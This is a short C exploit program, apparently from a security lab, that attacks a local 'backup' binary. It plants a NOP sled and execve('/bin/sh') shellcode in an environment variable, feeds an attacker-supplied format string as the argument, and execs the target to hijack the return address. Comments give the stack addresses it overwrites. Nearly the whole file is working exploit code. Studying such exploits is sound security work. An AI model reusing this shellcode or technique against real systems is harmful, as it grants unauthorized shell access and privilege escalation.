#include <stdio.h>
#include <unistd.h>
/*#include </usr/local/src/shellcode.h>*/ /*Our shellcode is 39 bytes or 41 with /bin/sh included*/

#define TARGET "/usr/local/bin/backup" /* or backupV2*/ 
  
int main(int argc, char **argv) 
{
	char *args[4];
	char *env[1];

	/*First we fill payload buffer with the address of the target (buffer address)*/
	int i, j;

	/*Store addresses 0xffbfdd2c and 0xffbfdd2e onto the stack
	  These are the lower and upper 2 bytes of the RET address location we are trying to overwrite
	*/
	
	/*"\xea\xdc\xbf\xff\xee\xdc\xbf\xff"*/ /*8 characters written*/
	/*args[0] = "AAAA%101$x";*/			/*Writes AA at addres 0xffbfdcee*/
	
	args[0] = argv[1];
			
			  
			  
	args[1] = "backup";
	args[2] = NULL; args[3] = NULL;
	env[0] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" /* NOP Sled first 40 char*/
			 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
			 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
			 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
			 "\x80\xe8\xdc\xff\xff\xff/bin/sh"; /*Address of this environment variable is 0xffbfdfaa*/

	if (execve(TARGET, args, env) < 0)
		fprintf(stderr, "execve failed.\n");
}